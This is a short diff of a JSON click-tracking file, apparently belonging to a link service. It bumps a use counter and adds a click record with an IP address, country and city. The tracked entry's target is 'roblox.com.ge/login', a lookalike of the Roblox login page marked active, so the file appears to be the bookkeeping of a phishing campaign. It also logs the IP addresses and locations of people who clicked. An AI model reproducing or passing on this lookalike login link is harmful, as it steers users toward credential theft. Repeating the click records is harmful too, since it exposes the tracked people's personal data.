@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1650,
+    "useCount": 1651,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13368,6 +13368,14 @@
         "city": "Llazicë",
         "flag": "🇽🇰",
         "countryCode": "XK"
+      },
+      {
+        "timestamp": 1777579248082,
+        "ip": "216.247.90.153",
+        "country": "Philippines",
+        "city": "Tuguegarao City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
